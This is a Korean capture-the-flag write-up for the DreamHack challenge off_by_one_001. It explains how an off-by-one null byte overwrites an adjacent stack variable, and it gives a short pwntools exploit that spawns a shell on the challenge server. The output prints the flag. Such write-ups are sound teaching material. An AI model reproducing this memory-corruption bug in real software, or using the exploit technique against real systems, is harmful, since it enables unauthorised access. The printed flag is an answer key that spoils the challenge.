# [DreamHack] off_by_one_001

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(off_by_one_001)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요.
> 셸을 획득한 후, “flag” 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [off_by_one_001.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8557450/off_by_one_001.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/162667436-d5399880-37f7-4b5f-8179-97928c0240fd.png)

## Analysis

```c
void read_str(char *ptr, int size)
{
    int len;
    len = read(0, ptr, size);
    printf("%d", len);
    ptr[len] = '\0'; // off-by-one
}

int main()
{
    char name[20];
    int age = 1;

    initialize();

    printf("Name: ");
    read_str(name, 20);

    printf("Are you baby?");

    if (age == 0)
    {
        get_shell();
    }
    else
    {
        printf("Ok, chance: \n");
        read(0, name, 20);
    }

    return 0;
}
```

`main()`의 스택에서 `age`는 `name` 바로 뒤에 인접해 있다. `name`에 20바이트를 가득 채워서 입력하면 off-by-one이 발생하여 `age`가 0으로 덮어씌워져서 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/off_by_one_001')
else:
    r = remote('host1.dreamhack.games', 22759)

r.sendafter('Name: ', 'a' * 20)

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 22759: Done
[*] Switching to interactive mode
20Are you baby?$ cat flag
DH{343bab3ef81db6f26ee5f1362942cd79}
```